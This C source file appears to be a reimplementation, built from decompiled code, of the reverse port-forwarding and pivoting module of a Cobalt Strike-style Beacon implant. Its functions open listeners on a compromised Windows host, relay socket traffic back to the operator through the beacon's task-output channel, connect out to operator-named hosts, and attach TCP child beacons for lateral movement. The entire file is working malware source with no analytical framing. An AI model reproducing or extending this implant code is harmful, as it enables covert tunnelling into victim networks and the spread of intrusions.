#include "Beaconrportfwd.h"
#include "common.h"
#include "comm.h"
#include <Winsock.h>
#include "ChildBeacon.h"


BeaconRportfwd* gBeaconRportfwd =0;
int sub_1000718A(short port)
{
	BeaconRportfwd* pBeaconRportfwd;
	for (pBeaconRportfwd = gBeaconRportfwd; pBeaconRportfwd; pBeaconRportfwd = pBeaconRportfwd->Linked)
	{
		if (pBeaconRportfwd->state && pBeaconRportfwd->field_10 == 2 && pBeaconRportfwd->port == port)
		{
			return 1;
		}
	}
	return 0;
}
SOCKET BeaconNewSocket(int addr, u_short port, int backlog)
{
	sockaddr_in name;
	u_long argp = 1;
	init_socket_options();
	SOCKET s = socket(AF_INET, SOCK_STREAM, NULL);
	if (s == -1)
	{
		return -1;
	}

	name.sin_family = AF_INET;
	name.sin_port = htons(port);
	name.sin_addr.S_un.S_addr = addr;
	if (ioctlsocket(s, 0x8004667E, &argp) == -1 || bind(s, (sockaddr*)&name, sizeof(sockaddr_in)) == -1 || listen(s, backlog) == -1)
	{
		closesocket(s);
		return -1;
	}
	return s;
}

int dword_10037E58;
int sub_10006D6B()
{
	return (dword_10037E58++ & 0x3FFFFFF) + 0x4000000;
}

void Add_Beacon_Rportfwd(int unknown, SOCKET socket, int a3, int a4, int port, int a6)
{

	BeaconRportfwd* pBeaconRportfwd = (BeaconRportfwd*)malloc(sizeof(BeaconRportfwd));
	BeaconRportfwd* pgBeaconRportfwd = gBeaconRportfwd;
	pBeaconRportfwd->Linked = gBeaconRportfwd;
	pBeaconRportfwd->field_0 = unknown;
	pBeaconRportfwd->socket = socket;
	pBeaconRportfwd->state = a6;
	int TickCount = GetTickCount();
	pBeaconRportfwd->field_C_time = 0;
	pBeaconRportfwd->field_18 = TickCount;
	pBeaconRportfwd->field_8_time = a3;
	pBeaconRportfwd->field_10 = a4;
	pBeaconRportfwd->port = port;
	while (pgBeaconRportfwd)
	{
		if (pgBeaconRportfwd->field_0 == unknown)
		{
			pgBeaconRportfwd->state = 0;
		}
		pgBeaconRportfwd = pgBeaconRportfwd->Linked;
	}
	gBeaconRportfwd = pBeaconRportfwd;
}

void sub_100071B7(char* Taskdata, int Task_size, int addr)
{
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	short port = BeaconDataShort(&pdatap);
	//检查是否已经监听了相关端口
	if (!sub_1000718A(port))
	{
		SOCKET s = BeaconNewSocket(addr, port, 10);
		if (s == -1)
		{
			BeaconErrorD(0x15u, port);
		}
		else
		{
			Add_Beacon_Rportfwd(sub_10006D6B(), s, 0, 2, port, 2);
		}
	}
}

void sub_1000728D(char* Taskdata, int Task_size)
{

	BeaconRportfwd* pgBeaconRportfwd = gBeaconRportfwd;
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	short port = BeaconDataShort(&pdatap);
	while (pgBeaconRportfwd)
	{
		if (pgBeaconRportfwd->state)
		{
			if (pgBeaconRportfwd->field_10 == 2 && pgBeaconRportfwd->port == port)
			{
				pgBeaconRportfwd->state = 0;
			}
			if (pgBeaconRportfwd->field_10 == 3 && pgBeaconRportfwd->port == port)
			{
				pgBeaconRportfwd->state = 0;
			}
		}
		pgBeaconRportfwd = pgBeaconRportfwd->Linked;
	}
}

void sub_10006D81()
{

    fd_set writefds;
    fd_set exceptfds;
    fd_set readfds;

    timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 100;
    BeaconRportfwd* pgBeaconRportfwd = gBeaconRportfwd;
    if (pgBeaconRportfwd)
    {
        while (1)
        {
            if (pgBeaconRportfwd->state != 2)
            {
                if (!pgBeaconRportfwd->Linked)
                {
                    return;
                }
                pgBeaconRportfwd = pgBeaconRportfwd->Linked;
                continue;
            }
            int data = htonl(pgBeaconRportfwd->field_0);
            writefds.fd_count = 0;
            exceptfds.fd_count = 0;
            readfds.fd_count = 0;

            writefds.fd_array[0] = pgBeaconRportfwd->socket;
            writefds.fd_count = 1;

            exceptfds.fd_array[0] = pgBeaconRportfwd->socket;
            exceptfds.fd_count = 1;
            
            readfds.fd_array[0] = pgBeaconRportfwd->socket;
            readfds.fd_count = 1;

            select(0, &readfds, &writefds, &exceptfds, &timeout);

            if (pgBeaconRportfwd->field_10 == 2)
            {
                if (__WSAFDIsSet(pgBeaconRportfwd->socket, &readfds))
                {
                    u_long argp = 1;
                    SOCKET s = accept(pgBeaconRportfwd->socket, 0, 0);
                    if (ioctlsocket(s, FIONBIO, &argp) == -1)
                    {
                        closesocket(s);
                        return;
                    }
                    int unknown = sub_10006D6B();
                    data = unknown;
                    Add_Beacon_Rportfwd(unknown, s, 180000, 0, 0, 1);
                    formatp pformatp;
                    BeaconFormatAlloc(&pformatp, 0x80u);
                    BeaconFormatInt(&pformatp, unknown);
                    BeaconFormatInt(&pformatp, pgBeaconRportfwd->port);
                    int length = BeaconFormatlength(&pformatp);
                    char* buffer = BeaconFormatOriginalPtr(&pformatp);
                    BeaconTaskOutput(buffer, length, 23);
                    BeaconFormatFree(&pformatp);
                }
            }
            else if (pgBeaconRportfwd->field_10 == 3)
            {
                if (__WSAFDIsSet(pgBeaconRportfwd->socket, &readfds))
                {
                    SOCKET s = accept(pgBeaconRportfwd->socket, 0, 0);
                    ChildBeacon pTcpChildBeacon = {0};
                    InitTcpChildBeacon(s, &pTcpChildBeacon);
                    int port = pgBeaconRportfwd->port | 0x110000;
                    AddChildBeacon(
                        port,
                        &pTcpChildBeacon,
                        &pTcpChildBeacon,
                        pTcpChildBeacon.recvChildBeacon,
                        pTcpChildBeacon.sendChildBeacon,
                        pTcpChildBeacon.closeChildBeacon,
                        pTcpChildBeacon.FlushFileBuffers,
                        pTcpChildBeacon.checkChildBeacon);
                }
            }
            else
            {
                if (__WSAFDIsSet(pgBeaconRportfwd->socket, &exceptfds))
                {
                    pgBeaconRportfwd->state = 0;
                    BeaconTaskOutput((char*)&data, 4, 4);
                    pgBeaconRportfwd = pgBeaconRportfwd->Linked;
                    if (!pgBeaconRportfwd)
                    {
                        return;
                    }
                    continue;
                }
                if (__WSAFDIsSet(pgBeaconRportfwd->socket, &writefds))
                {
                    pgBeaconRportfwd->state = 1;
                    BeaconTaskOutput((char*)&data, 4, 6);
                    pgBeaconRportfwd = pgBeaconRportfwd->Linked;
                    if (!pgBeaconRportfwd)
                    {
                        return;
                    }
                    continue;
                }
                if (!__WSAFDIsSet(pgBeaconRportfwd->socket, &readfds))
                {
                    if (GetTickCount() - pgBeaconRportfwd->field_18 <= pgBeaconRportfwd->field_8_time)
                    {
                        pgBeaconRportfwd = pgBeaconRportfwd->Linked;
                        if (!pgBeaconRportfwd)
                        {
                            return;
                        }
                        continue;
                    }

                    pgBeaconRportfwd->state = 0;
                    BeaconTaskOutput((char*)&data, 4, 4);
                    pgBeaconRportfwd = pgBeaconRportfwd->Linked;
                    if (!pgBeaconRportfwd)
                    {
                        return;
                    }
                    continue;
                }
                SOCKET ss = accept(pgBeaconRportfwd->socket, 0, 0);
                pgBeaconRportfwd->socket = ss;
                if (ss == -1)
                {
                    pgBeaconRportfwd->state = 0;
                    BeaconTaskOutput((char*)&data, 4, 4);
                }
                else
                {
                    pgBeaconRportfwd->state = 1;
                    BeaconTaskOutput((char*)&data, 4, 6);
                }
                closesocket(ss);
            }
            pgBeaconRportfwd = pgBeaconRportfwd->Linked;
            if (!pgBeaconRportfwd)
            {
                return;
            }
        }
    }
}


int sub_10006981(char* buffer, SOCKET s, int size)
{

    if (size <= 0)
    {
        return 0;
    }
    int recvsize=0;
    while (1)
    {
        int ret = recv(s, &buffer[recvsize], size - recvsize, 0);
        recvsize += ret;
        if (ret == -1)
        {
            break;
        }
        if (recvsize >= size)
        {
            return recvsize;
        }
    }
    shutdown(s, 2);
    closesocket(s);
    return -1;
}

char* precvdata=0;
int sub_1000707E()
{
    int n=0;
    BeaconRportfwd* pgBeaconRportfwd = gBeaconRportfwd;
    if (!precvdata)
    {
        precvdata = (char*)malloc(0x100000u);
    }
   
    while (pgBeaconRportfwd)
    {
        if (pgBeaconRportfwd->state != 1)
        {
            pgBeaconRportfwd = pgBeaconRportfwd->Linked;
            continue;
        }
        *(int*)precvdata = htonl(pgBeaconRportfwd->field_0);
        u_long argp = 0;
        int ret = ioctlsocket(pgBeaconRportfwd->socket, 0x4004667F, &argp);
        if (argp > 0xFFFFC)
        {
            argp = 0xFFFFC;
        }
        if (ret == -1)
        {
            pgBeaconRportfwd->state = 0;
            BeaconTaskOutput(precvdata, 4, 4);
            pgBeaconRportfwd = pgBeaconRportfwd->Linked;
            continue;
        }
        if (!argp)
        {
            pgBeaconRportfwd = pgBeaconRportfwd->Linked;
            continue;
        }
        int recvsize = sub_10006981(precvdata + 4, pgBeaconRportfwd->socket, argp);//argp=12
        if (recvsize == -1)
        {
            pgBeaconRportfwd->state = 0;
            BeaconTaskOutput(precvdata, 4u, 4u);
        }
        else if (recvsize == argp)
        {
            BeaconTaskOutput(precvdata, argp + 4, 5);//
            ++n;
        }

        pgBeaconRportfwd = pgBeaconRportfwd->Linked;
    }
    return n;
}

void sub_10006FF5()
{
    BeaconRportfwd* temp=0;
    BeaconRportfwd* pgBeaconRportfwd = gBeaconRportfwd;
    if (pgBeaconRportfwd)
    {
        while (1)
        {
            if (pgBeaconRportfwd->state)
            {
                temp = pgBeaconRportfwd;
                pgBeaconRportfwd = pgBeaconRportfwd->Linked;
                if (!pgBeaconRportfwd)
                {
                    return;
                }
                continue;
            }
            if (!pgBeaconRportfwd->field_C_time)
            {
                pgBeaconRportfwd->field_C_time = GetTickCount();
                temp = pgBeaconRportfwd;
                pgBeaconRportfwd = pgBeaconRportfwd->Linked;
                if (!pgBeaconRportfwd)
                {
                    return;
                }
                continue;
            }
            if (GetTickCount() - pgBeaconRportfwd->field_C_time <= 0x3E8)
            {
                temp = pgBeaconRportfwd;
                pgBeaconRportfwd = pgBeaconRportfwd->Linked;
                if (!pgBeaconRportfwd)
                {
                    return;
                }
                continue;
            }
            if (!pgBeaconRportfwd->field_10)
            {
                shutdown(pgBeaconRportfwd->socket, 2);
            }
            if (closesocket(pgBeaconRportfwd->socket) && pgBeaconRportfwd->field_10 == 2)
            {
                temp = pgBeaconRportfwd;
                pgBeaconRportfwd = pgBeaconRportfwd->Linked;
                if (!pgBeaconRportfwd)
                {
                    return;
                }
                continue;
            }
            if (!temp)
            {
                gBeaconRportfwd = pgBeaconRportfwd->Linked;
                free(pgBeaconRportfwd);
                return;
            }
            temp->Linked = pgBeaconRportfwd->Linked;
            free(pgBeaconRportfwd);
            pgBeaconRportfwd = temp->Linked;
            if (!pgBeaconRportfwd)
            {
                return;
            }
        }

    }


}


void sub_10006B2B(char* Taskdata,int taskdatasize)
{
    int unknown = ntohl(*(u_long*)Taskdata);
    int port = ntohs(*(u_short*)(Taskdata+4));
    int size = taskdatasize - 6;
    if (size >= 1023)
    {
        size = 1023;
    }
    char name[1024];
    memcpy(name, Taskdata+6, size);
    name[size] = 0;
    init_socket_options();
    SOCKET s = socket(2, 1, 0);
    if (s == -1)
    {
        closesocket(0xFFFFFFFF);

        BeaconTaskOutput(Taskdata, 4u, 4u);
        return;
    }
    hostent* host = gethostbyname(name);
    if (!host)
    {
        closesocket(s);
        BeaconTaskOutput(Taskdata, 4u, 4u);
        return;
    }

	sockaddr_in addr;
	memcpy(&addr.sin_addr, *(const void **)host->h_addr_list, host->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;

    u_long argp =1;
    if (ioctlsocket(s, 0x8004667E, &argp) == -1
        || connect(s, (sockaddr *)&addr, sizeof(sockaddr_in)) == -1 && WSAGetLastError() != 10035)
    {
        closesocket(s);
        BeaconTaskOutput(Taskdata, 4u, 4u);
        return;
    }
    Add_Beacon_Rportfwd(unknown, s, 30000, 0, 0, 2);
}



void sub_10006C36(BeaconRportfwd* pBeaconRportfwd, char* buf, int len)
{
    fd_set writefds;
    fd_set exceptfds;

    timeval timeout; 
    timeout.tv_sec = 0;
    timeout.tv_usec = 100;

    int time = GetTickCount() + 30000;

    while (GetTickCount() < time)
    {
        writefds.fd_array[0] = pBeaconRportfwd->socket;
        writefds.fd_count = 1;

        exceptfds.fd_array[0] = writefds.fd_array[0];
        exceptfds.fd_count = 1;

        select(0, 0, &writefds, &exceptfds, &timeout);
        if (__WSAFDIsSet(pBeaconRportfwd->socket, &exceptfds))
        {
            break;
        }
        if (__WSAFDIsSet(pBeaconRportfwd->socket, &writefds))
        {
            if (send(pBeaconRportfwd->socket, buf, len, 0) != -1 || WSAGetLastError() != 10035)
            {
                return;
            }
            Sleep(0x3E8);
        }
    }
}

void sub_10006CFC(char* Taskdata, int taskdatasize)
{

    BeaconRportfwd* pgBeaconRportfwd = gBeaconRportfwd;
    u_long unknown = ntohl(*(u_long*)Taskdata);

    while (pgBeaconRportfwd)
    {
        if (pgBeaconRportfwd->state == 1 && unknown == pgBeaconRportfwd->field_0)
        {
            sub_10006C36(pgBeaconRportfwd, Taskdata+4, taskdatasize-4);
        }
        pgBeaconRportfwd = pgBeaconRportfwd->Linked;
    }
}

void sub_10006ACD(char* Taskdata)
{

    datap pdatap;
    int unknown = BeaconDataInt(&pdatap);
    short port = BeaconDataShort(&pdatap);
    SOCKET socket = BeaconNewSocket(0, port, 1);
    if (socket == -1)
    {
        BeaconTaskOutput(Taskdata, 4u, 4u);
    }
    else
    {
        Add_Beacon_Rportfwd(unknown, socket, 180000, 1, port, 2);
    }
}